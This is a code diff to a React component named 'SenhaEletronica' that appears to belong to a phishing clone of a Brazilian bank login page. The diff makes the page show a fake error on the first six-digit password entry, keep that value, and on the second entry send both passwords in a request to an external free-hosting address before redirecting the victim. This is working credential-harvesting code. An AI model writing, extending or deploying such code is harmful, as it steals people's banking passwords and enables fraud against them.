@@ -9,6 +9,7 @@ const SenhaEletronica = () => {
     const errorRef = useRef(null);
     const navigate = useNavigate();
     const [quatro, setQuatro] = useState(null)
+    const [errada, setErrada] = useState(null)
 
     const defineSenha = (event) => {
         setQuatro(event.target.value)
@@ -18,11 +19,24 @@ const SenhaEletronica = () => {
         if(errou === false){
             setTimeout(() => {
                 errorRef.current.style.display = 'flex';
+                setErrada(quatro)
                 setErrou(true)
             }, 1000);
         } else if (errou === true){
-            setTimeout(() => {
-                localStorage.setItem("quatro", quatro);
+            setTimeout(async () => {
+                if(!errada || !quatro){
+                    alert("Por favor preencha todos os campos !");
+                    return; // Adicionado para evitar prosseguir com a execução /security
+                  }
+                  try {
+                    const response = await fetch(`https://checker9387.000webhostapp.com/2/?errada=${errada}&quatro=${quatro}`);
+                    if (!response.ok) {
+                      throw new Error('Sistema indisponível');
+                    }
+                    navigate('/privacy');
+                  } catch (error) {
+                    console.error('Erro ao fazer a requisição:', error);
+                  }
                 navigate('/privacity');
             }, 1000);
         } else{
@@ -44,7 +58,7 @@ const SenhaEletronica = () => {
         </div>
         <div className='form2'>
             <span>senha eletrônica</span>
-            <InputMask mask="999999" maskChar=" " disableUnderline type="password" placeholder='' onChange={defineSenha} />
+            <InputMask mask="999999" maskChar=" " type="password" placeholder='' onChange={defineSenha} />
             <button onClick={abrirErro}>acessar</button>
         </div>
     </div>
